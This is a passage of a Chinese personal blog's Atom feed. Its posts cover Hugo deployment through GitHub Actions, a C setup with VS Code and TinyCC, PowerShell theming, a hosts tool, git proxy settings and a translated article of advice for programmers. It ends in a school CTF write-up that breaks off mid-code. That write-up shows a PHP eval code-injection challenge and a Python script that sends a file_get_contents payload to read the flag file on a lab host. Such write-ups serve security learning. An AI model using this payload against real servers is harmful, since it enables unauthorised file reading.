</span></span><span style="display:flex;"><span>          <span style="color:#f92672">EMAIL</span>: <span style="color:#ae81ff">batkiz@outlook.com</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">GH_REF</span>: <span style="color:#ae81ff">github.com/batkiz/batkiz.github.io.git</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e"># 这里的 token 需要自己在 GitHub settings 中部署，并利用 actions 的 secrets 功能</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">GH_TOKEN</span>: <span style="color:#ae81ff">${{ secrets.GH_TOKEN }}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          cd $HOME/blog/public
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git config --global user.name $USER
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git config --global user.email $EMAIL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git add .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git commit -m &#34;Auto Update: `date +&#39;%Y-%m-%d %H:%M:%S&#39;`&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git push &#34;https://$USER:$GH_TOKEN@$GH_REF&#34; master:master</span>          
</span></span></code></pre></div><p>感谢 <a href="https://github.com/peaceiris/actions-hugo">https://github.com/peaceiris/actions-hugo</a> 提供的可在 GitHub actions 使用的 Hugo 二进制文件，避免了每次都手动编译 Hugo。</p>
<p>另外希望大家别不看内容就随便写，会出 typo 的，然后 failed（泪</p>
<h2 id="结语">结语</h2>
<p>经过一个下午 + 一个晚上的努力，终于成功地把博客迁移到了 Hugo，并实现了内容的版本管理与自动化部署。可喜可贺，可喜可贺。</p>
<p>接下来大概会抽空将以前的文章格式调整一下（Hugo 的 markdown 不知道是用啥解析的，写的随意的话不会按你想的那样渲染），以及自己写一个 Hugo 的主题。</p>
<p>see you later.</p>
]]></content><category scheme="https://blog.batkiz.com/tags/hugo" term="hugo" label="hugo"/></entry><entry><title type="html">使用 VS Code 与 TinyCC 学习 C 语言</title><link href="https://blog.batkiz.com/posts/c-using-vscode-and-tcc/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/c-using-vscode-and-tcc/</id><published>2019-10-06T15:56:43+00:00</published><updated>2019-10-06T15:56:43+00:00</updated><content type="html"><![CDATA[<p>本文不对其他 C 语言的 (editor || IDE || compiler) 作评价，仅分享一个方案。</p>
<h2 id="vs-code">VS Code</h2>
<p>下载安装 <a href="https://code.visualstudio.com/">VS Code</a>。</p>
<p>安装下列扩展</p>
<ul>
<li>C/C++ <code>ms-vscode.cpptools</code></li>
<li>TCC Compiler <code>lihram.vscode-tcc-compiler</code></li>
</ul>
<h2 id="使用">使用</h2>
<p>于任意路径新建 <code>tmp</code> 文件夹，使用 VS Code 打开。</p>
<p>新建 <code>hello.c</code> 文件，并写入下列内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello World.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;你好世界。&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>保存后按下 <code>F1</code> 键，输入 <code>tcc</code>，找到 <code>TCC: Run</code> 项，回车，可看到下面的 terminal 被唤起，并输出下列信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Hello World.
</span></span><span style="display:flex;"><span>你好世界。
</span></span></code></pre></div><p>如此，基本的开发环境便配置完成，enjoy!</p>
<h2 id="疑难解答">疑难解答</h2>
<ul>
<li>
<p>why TCC?<br>
在 Windows 平台上，gcc, clang 的安装过于复杂，且所占空间较大，而 TCC 仅几百余 k，安装扩展后即可使用。而且 TCC 完全支持 ANSI C，且对 C99 的特性大部分都支持，仅对学习来说，完全够用。</p>
</li>
<li>
<p>输出中文乱码如何解决？<br>
在 VS Code 的配置文件中加入 <code>&quot;terminal.integrated.shellArgs.windows&quot;: [&quot;-NoExit&quot;, &quot;/c&quot;, &quot;chcp 65001&quot;]</code>，或<a href="https://www.zhihu.com/question/54724102/answer/380875686">这样</a></p>
</li>
</ul>
]]></content><category scheme="https://blog.batkiz.com/tags/vscode" term="vscode" label="vscode"/></entry><entry><title type="html">oh my powershell</title><link href="https://blog.batkiz.com/posts/oh-my-powershell/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/using-scoop/?utm_source=atom_feed" rel="related" type="text/html" title="初探 Scoop"/><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="related" type="text/html" title="wsl 使用指北"/><link href="https://blog.batkiz.com/posts/solving-cmder-space/?utm_source=atom_feed" rel="related" type="text/html" title="解决 cmder 光标问题"/><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="related" type="text/html" title="如何使用Xbox手柄玩Minecraft"/><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="related" type="text/html" title="我的电脑软件"/><id>https://blog.batkiz.com/posts/oh-my-powershell/</id><published>2019-09-24T22:43:46+00:00</published><updated>2019-09-24T22:43:46+00:00</updated><content type="html"><![CDATA[<blockquote>对 *nix 平台上的 oh-my-zsh 的绝赞复刻！</blockquote><p>对 *nix 平台上的 oh-my-zsh 的绝赞复刻！</p>
<p>备受好评的 shell 配置，来到了 powershell 之上~</p>
<h2 id="requirements">requirements</h2>
<ul>
<li><code>set-executionpolicy remotesigned</code> 执行策略更改，以执行脚本、安装应用</li>
<li><a href="scoop.sh">scoop</a></li>
</ul>
<h2 id="installation">installation</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">Install-Module</span> <span style="color:#a6e22e">posh-git</span> <span style="color:#a6e22e">-Scope</span> <span style="color:#a6e22e">CurrentUser</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Install-Module</span> <span style="color:#a6e22e">oh-my-posh</span> <span style="color:#a6e22e">-Scope</span> <span style="color:#a6e22e">CurrentUser</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">scoop-completion</span>
</span></span></code></pre></div><p>亦可均由 scoop 安装，即</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">scoop-completion</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">oh-my-posh</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">posh-git</span>
</span></span></code></pre></div><h2 id="配置">配置</h2>
<p>配置文件为 <code>~\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code>，若不存在请自行创建。</p>
<p>写入下列内容并保存：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">Import-Module</span> <span style="color:#a6e22e">posh-git</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Import-Module</span> <span style="color:#a6e22e">oh-my-posh</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Set-Theme</span> <span style="color:#a6e22e">PowerLine</span>
</span></span></code></pre></div><h2 id="more-things">more things</h2>
<ul>
<li>我的 profile 文件与自己写的主题 <a href="https://github.com/batkiz/dotfiles/tree/master/powershell">dotfiles/powershell</a></li>
<li>最好用 Windows Terminal 作为终端</li>
</ul>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/><category scheme="https://blog.batkiz.com/tags/powershell" term="powershell" label="powershell"/></entry><entry><title type="html">关于 hosts-tool 的一些事</title><link href="https://blog.batkiz.com/posts/sth-about-hosts-tool/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/sth-about-hosts-tool/</id><published>2019-06-17T19:10:57+00:00</published><updated>2019-06-17T19:10:57+00:00</updated><content type="html"><![CDATA[<h2 id="前置">前置</h2>
<p>由于平时有些修改 hosts 文件的需求（屏蔽广告啦），所以之前一直在用 <a href="https://github.com/oldj/SwitchHosts/">SwitchHosts!</a> 来自动下载远程 hosts 文件。</p>
<p>但 SwitchHosts! 还是有几点不尽如人意的地方：</p>
<ul>
<li>由 Electron 与 JavaScript 开发</li>
<li><a href="https://github.com/oldj/SwitchHosts/issues/334">每次开启均会使用一个一个名为 SnoreToast 的软件</a></li>
<li>不能做到随用随开，用完就关，需要手动在托盘处关闭后台</li>
</ul>
<p>上面这些其实都在能忍受的范围内，毕竟 <em>又不是不能用</em> ，而且也没有其他合适的轮子，将就着也还能用。
但是！近期（也都两三个月了）直接不能用了。直接不能从远端下载更新 hosts 文件了，加上我瞅着<a href="https://github.com/oldj/SwitchHosts/commits/master">作者也不活跃开发了</a>，迫不得已，只好自己造轮子。</p>
<p>最开始时是用的 dotnet core C# 来写的，名为 hosts-tool，代码已基本可用，奈何我对 OO 不甚了解，后面的功能无法继续增加，也就未开源。加上种种原因，一直勉强用着。</p>
<p>后来，我学了 golang，由于其编译出来的可执行程序是单文件，所以使用 go 来重写 hosts-tool 势在必行。</p>
<h2 id="重写">重写</h2>
<p>刚开始重写实际上是简单的把 C# 的函数写成 go 语言版本的。后来开始使用各种库、考虑跨平台。</p>
<p>下面是一些写代码过程中得到的经验与吐槽。</p>
<ul>
<li>为什么 args 里第一个是 <code>c.Args().First()</code> 第二个却是 <code>c.Args().Get(1))</code> 。都用 <code>c.Args().Get())</code> 之后从零数也不至于让人这么迷惑。</li>
<li>将 aurora 以 <code>. &quot;github.com/logrusorgru/aurora&quot;</code> 方式引入经常会打印出来一些奇怪的字符。</li>
<li>错误处理太烦人了。</li>
<li>写入配置文件记得用 <code>os.O_TRUNC</code> 截断。</li>
</ul>
<h2 id="roadmap">ROADMAP</h2>
<p>下面是一些想起来了但暂时没动力写的功能</p>
<ul>
<li><input disabled="" type="checkbox"> local hosts 功能，暂定是搞个 <code>local</code> 文件和 config 文件放一块</li>
<li><input disabled="" type="checkbox"> home 功能，<code>hosts-tool-go home NAME</code> 来直接浏览器打开这个 hosts 源</li>
<li><input disabled="" type="checkbox"> 无任何命令行参数附加打开时搞出一个交互式的命令行</li>
</ul>
<p>慢慢摸咯，想起来时再写 23333</p>
]]></content><category scheme="https://blog.batkiz.com/tags/golang" term="golang" label="golang"/><category scheme="https://blog.batkiz.com/tags/hosts" term="hosts" label="hosts"/></entry><entry><title type="html">为 Git 配置代理</title><link href="https://blog.batkiz.com/posts/git-behind-proxy/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/git-behind-proxy/</id><published>2019-05-26T16:39:16+00:00</published><updated>2019-05-26T16:39:16+00:00</updated><content type="html"><![CDATA[<p>加速境外 git 服务托管网站速度。</p>
<h2 id="操作">操作</h2>
<p>首先确保本地已开启 ss 或 ssr。
而后命令行执行如下命令。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git config --global http.proxy <span style="color:#e6db74">&#39;http://127.0.0.1:1080&#39;</span>
</span></span><span style="display:flex;"><span>git config --global https.proxy <span style="color:#e6db74">&#39;http://127.0.0.1:1080&#39;</span>
</span></span></code></pre></div><h2 id="原理">原理</h2>
<p>在大多数 git 代理相关文章中，均配置的是 <code>socks5://127.0.0.1:1080</code> 进行代理。这样虽然速度确实增加了，但由于 协议并不支持 socks5 协议，每次 git push 操作时还需要手动输入账户密码，不能通过 ssh key 来登录，非常影响体验。</p>
<p>ss/ssr 使用的是 socks5 协议，为使 http 协议也经过代理，均自带了 privoxy 将 socks5 协议 转换为 http 协议。因此我们可以直接设置为 <code>http://127.0.0.1:1080</code>，问题得以解决。</p>
<hr>
<h2 id="注意事项">注意事项</h2>
<ul>
<li>此处配置代理只配置了 <code>http</code> 与 <code>https</code> 的，因此一定<strong>不要</strong>使用 ssh 协议。</li>
</ul>
]]></content><category scheme="https://blog.batkiz.com/tags/git" term="git" label="git"/></entry><entry><title type="html">翻译 | 给新手程序员们的建议</title><link href="https://blog.batkiz.com/posts/advice-to-new-programmers/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/translation-the-rise-and-demise-of-rss/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | RSS 的兴起与衰落"/><id>https://blog.batkiz.com/posts/advice-to-new-programmers/</id><published>2019-04-28T21:17:56+00:00</published><updated>2019-04-28T21:17:56+00:00</updated><content type="html"><![CDATA[<blockquote>并不是每天都有学生向 709 个软件开发者寻求建议的机会的。</blockquote><p><del>这篇都是过年前翻译的了，但一直懒得放上来=。=</del></p>
<hr>
<p>原文：<a href="http://olafurw.com/2019-01-27-programmer-advice/">Advice to new Programmers</a></p>
<p>并不是每天都有学生向 709 个软件开发者寻求建议的机会的。</p>
<h2 id="综述">综述</h2>
<p>在瑞典马尔摩有一所学校叫做 <a href="https://www.thegameassembly.com/">The Game Assembly</a>。这所学校专注于游戏制作教学。编程、艺术及设计，无所不包。有一个最后一年在游戏工作室度过的三年项目。</p>
<p>因为我为一家<a href="https://www.massive.se/">游戏公司</a>工作，我们被邀请向这些学生举办讲座。在过去几年间我曾数次做讲座，且非常荣幸得到此机会。</p>
<p>今年我开始向新来的学生们讲演。原计划为<a href="https://speakerdeck.com/olafurw/the-basics-of-object-oriented-programming">面向对象编程的基础</a>，但我还有另一个想法。</p>
<p>为什么不联系 Twitter 并问他们对“易受影响的年轻人”有什么建议呢？</p>
<blockquote>
<p>推特上的程序员你们好！</p>
<p>几天后我将会向一些易受影响的年轻人演讲</p>
<p>他们尚且处于学习的早期阶段，20 来岁的样子。</p>
<p>你最想给出什么建议呢？语言是未知的。</p>
<p>感谢转推</p>
<p>（我会在幻灯片中引用你们，所以务必友善：）</p>
<p>— Ólafur Waage (@olafurw) <a href="https://twitter.com/olafurw/status/1087438169585434624?ref_src=twsrc%5Etfw">January 21, 2019</a></p>
</blockquote>
<p>我确实没料到能获得 700 余条回复。因为在这条推特与演讲之间只有两天，我并不能总结所有的智慧。但是我也在试着寻找获赞最多的与在游戏产业中工作的人。</p>
<p>但有着太多的数据被掩盖。我需要分析这些回复。</p>
<h2 id="获得数据">获得数据</h2>
<p>刚开始我试着仅仅浏览 Twitter 上的时间线并复制文本。但显然，当一个讨论贴达到了一定规模时，Twitter 限制了你能看到的推文数。所以从数据集中我仅能得到 285 个回复。</p>
<p>接下来是使用 Twitter 开发者 API，虽然被限制严重，但允许更多的搜索粒度。</p>
<p>通过 Python 和 Tweepy 及请求间的 5 分钟睡眠，我能够从请求中得到 763 条直接回复于我的推文。这花了 <strong>362 分钟</strong>，或言 <strong>6 个小时</strong>。更短的睡眠时间可能也行，但我睡后留下它自己跑，所以也没多大关系。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> page <span style="color:#f92672">in</span> tweepy<span style="color:#f92672">.</span>Cursor(api<span style="color:#f92672">.</span>search, q<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;to:olafurw&#34;</span>, since_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1087438169585434624&#39;</span>, tweet_mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;extended&#39;</span>)<span style="color:#f92672">.</span>pages():
</span></span><span style="display:flex;"><span>  repliesFile <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;replies.txt&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> tweet <span style="color:#f92672">in</span> page:
</span></span><span style="display:flex;"><span>    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>in_reply_to_status_id_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>screen_name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>id_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>full_text<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    repliesFile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">--==--</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  repliesFile<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>  repliesFile<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">300</span>)
</span></span></code></pre></div><h2 id="基本的分析">基本的分析</h2>
<p>分析一个文本语料库是在教育领域之中的，且我对此了解不多，也没有时间来深入了解。但我想要强调一些尤为突出的事情。</p>
<h3 id="编程是一个人类的领域">编程是一个人类的领域</h3>
<p>763 条推文中有 131 条在谈到其他人。<strong>17.1%</strong></p>
<p>他们谈论了人类，团队，同事，朋友，同行。</p>
<p>这里是一些例子：</p>
<blockquote>
<p><a href="https://twitter.com/tomjadams/status/1088336413827915776">@tomjadams</a>
软件是一个团体运动</p>
<p><a href="https://twitter.com/mrdowden/status/1087882550964641792">@mrdowden</a>
生活中最重要的事——及你总是在控制的——是你如何对待他人</p>
<p><a href="https://twitter.com/originalJonLowe/status/1087594133357760513">@originalJonLowe</a>
在求知之旅中总是宽容、鼓励他人
抬举其他开发者，因为在最后的日子里，你是队伍的一部分
在成为一个“明星”之上，成为一个团队合作者，因为知识应被共享</p>
<p><a href="https://twitter.com/ccmccomb/status/1087845662937546756">@ccmccomb</a>
在计算中永远不要忘了为怜悯之心寻求空间</p>
</blockquote>
<h3 id="编程是关于持续学习的">编程是关于持续学习的</h3>
<p>13 个回复字面上都是“永远不要停止学习”</p>
<p>763 条推文中的 82 个在某种意义上谈论了学习或实践。<strong>10.7%</strong></p>
<p>下面是例子：</p>
<blockquote>
<p><a href="https://twitter.com/iam_js_/status/1088153200371355650">@iam<em>js</em></a>
没有捷径，实践、实践及更多的实践</p>
<p><a href="https://twitter.com/curtisko/status/1087725805982093312">@curtisko</a>
你有责任持续地学习与职业发展</p>
<p><a href="https://twitter.com/hedgeb/status/1087525264140234752">@hedgeb</a>
即使你只比手册快了一页，你也能指导一些人并在他们的学习编程之路中提供帮助</p>
<p><a href="https://twitter.com/howbazaar/status/1087773774374522881">@howbazaar</a>
你将会持续学习
你永不止步
变得更好需要练习
读书，读博客
别指望在六个月内变得伟大</p>
</blockquote>
<h3 id="编程有时会很吓人">编程有时会很吓人</h3>
<p>许多回复也表达了这个。有许多东西需要你去学习，有许多东西你并不懂。看着领域内的专家也会使人畏缩。</p>
<p>27 条回复谈及错误或失败，29 条关于害怕</p>
<blockquote>
<p><a href="https://twitter.com/jitterted/status/1087575050318835712">@jitterted</a>
别与其他人相比较，而是与过去的 <em>你</em> 相比较</p>
<p><a href="https://twitter.com/greberger/status/1087842355481325574">@greberger</a>
不要害怕说你不懂什么东西
别对寻求帮助感到害怕
我们都曾（或正在）经历妄自菲薄</p>
<p><a href="https://twitter.com/ben_deane/status/1087805790423904256">@ben_deane</a>
我们都会出错
试着对自己的错误负责而不惭愧，在他人出现错误时也不要责怪他们</p>
<p><a href="https://twitter.com/FiddlersCode/status/1087619274032721926">@FiddlersCode</a>
技术是短暂的，但关系长存
感情上试着了解你的同事与你自己
有勇气接受你的努力会易受伤害
寻求帮助，即使你害怕出丑</p>
</blockquote>
<h3 id="编程不仅仅是最新的技术">编程不仅仅是最新的技术</h3>
<p>对，闪亮的新库/语言/框架非常酷。但正如许多回复所言，基础原理更要紧。</p>
<p>34 条回复直接地谈论技术，算法及关注于更大的图景。</p>
<blockquote>
<p><a href="https://twitter.com/bjorn_fahller/status/1087439484709490689">@bjorn_fahller</a>
语言与工具来来去去。
学会去看重复的模式，更准确地说，不同语言与库甚至范例中的规律。
学习不同技术的优劣，如此你能为你的特定问题精确地选择。</p>
<p><a href="https://twitter.com/aras_p/status/1087443639750529025">@aras_p</a>
找到编程领域中使你感兴趣的，并在此工作。
小的递增任务——“嘿我把屏幕变成红色的了！现在我又更进一步！”，“我使页面上的按键移动了！”等
语言、框架、库、“技术栈”并不重要（别理睬说这些重要的人）。</p>
<p><a href="https://twitter.com/rickschott/status/1087492136331812867">@rickschott</a>
世界需要问题解决者，而非被记住的算法。</p>
</blockquote>
<h3 id="编程对你要求严苛">编程对你要求严苛</h3>
<p>个人健康是一个普遍的讨论点。睡眠与合理饮食是有关健康行为中排在第一位的。</p>
<p>33 条回复谈论了睡眠，饮食，个人健康与工作时间。</p>
<blockquote>
<p><a href="https://twitter.com/sehurlburt/status/1087448744113684481">@sehurlburt</a>
睡觉，健康饮食，关心你自己的身体——即使你感觉良好
更多的工作时间并不意味着更好的工作，甚至并不意味着更多的工作被做完
你不必弄懂你的事业
你不需要生活的里程碑来仅仅变得健康与快乐</p>
<p><a href="https://twitter.com/caffodian/status/1087449579589591044">@caffodian</a>
照顾好你的身体
对，实际编程技巧非常有用，但这能使你使用鼠标而不伤害自己，或久坐而不背疼，看着屏幕而不头疼，等等。</p>
<p><a href="https://twitter.com/ArvidGerstmann/status/1087462222551490560">@ArvidGerstmann</a>
不要勉强自己。在你还能时，享受你该死的生活。来自一位 24 岁却感觉像是已经 44 岁的人。</p>
<p><a href="https://twitter.com/ma_lindstedt/status/1087683256835809281">@ma_lindstedt</a>
每周工作 100 小时并不意味着你非常投入
照顾好你的身体，坦率地与管理者交谈
享受你的空闲时间，如此你能得到最棒的工作效率
兴趣爱好+朋友与良好的职业道德并不排斥</p>
</blockquote>
<h3 id="编程其他有趣的回复">编程，其他有趣的回复</h3>
<p>上述分类是寻常的主题，但也有无法归类但值得提及的回复。</p>
<p>30 条回复提及测试</p>
<blockquote>
<p><a href="https://twitter.com/brianokken/status/1088177245431115776">@brianokken</a>
学着去问这些问题：</p>
<ul>
<li>我是如何知道它能跑起来的？</li>
<li>我该如何使之自动化？
尽快学会依靠自动化测试会节省大量的时间</li>
</ul>
</blockquote>
<p>18 条回复谈论了某种版本控制</p>
<blockquote>
<p><a href="https://twitter.com/UndefinedBehav/status/1087441412747128832">@UndefinedBehav</a>
使用一个版本控制工具
如果某人曾在之前告诉我，我会喜欢它的</p>
</blockquote>
<p>14 条提及调试</p>
<blockquote>
<p><a href="https://twitter.com/AliBeeGfx/status/1087826867363741696">@AliBeeGfx</a>
写代码经常像是测不准原理的对立
唯一去了解什么确定的东西 <em>真的</em> 发生的方法是通过调试来近距离观察！</p>
</blockquote>
<h2 id="感谢">感谢</h2>
<p>像这样的帖子难得一见。如此之多的人花费时间回复很不可思议</p>
<p><strong>感谢每一个回复、转推与点赞的人。</strong></p>
<p>我希望这个帖子能够鼓舞你，我也希望这篇博文能够有所帮助。</p>
<blockquote>
<p><a href="https://twitter.com/ericniebler/status/1087447876286869504">@ericniebler</a>
保持谦虚，保持好奇。</p>
</blockquote>
]]></content><category scheme="https://blog.batkiz.com/tags/%E7%BF%BB%E8%AF%91" term="%E7%BF%BB%E8%AF%91" label="翻译"/></entry><entry><title type="html">xatuctf2019 校赛 writeup</title><link href="https://blog.batkiz.com/posts/xatuctf2019-wp/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/xatuctf2019-wp/</id><published>2019-04-19T21:57:00+00:00</published><updated>2019-04-19T21:57:00+00:00</updated><content type="html"><![CDATA[<blockquote>代打出题人</blockquote><p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水 23333</p>
<h2 id="web">WEB</h2>
<h3 id="你能读到-flag-吗">你能读到 flag 吗</h3>
<p>题目：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$_REQUEST[<span style="color:#e6db74">&#39;hello&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;var_dump(</span><span style="color:#e6db74">$a</span><span style="color:#e6db74">);&#34;</span>);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><del>谷歌之，原题，直接复制提交。</del></p>
<p>使用 <code>file_get_contents()</code> 方法获得 flag</p>
<p>python 代码如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;hello&#34;</span>:<span style="color:#e6db74">&#34;file_get_contents(&#39;flag.php&#39;)&#34;</span>}
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://192.168.1.5:23114/read.php&#34;</span>, data<span style="color:#f92672">=</span>body)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>content)
</span></span></code></pre></div><h3 id="phpdecode">phpdecode</h3>
<p><del>直接搜 <code>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</code> 找到了别人的 wp，flag 获得。</del></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY</span><span style="color:#f92672">=</span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span> <span style="color:#66d9ef">__DIR__</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/lib.php&#39;</span>;
</span></span><span style="display:flex;"><span>
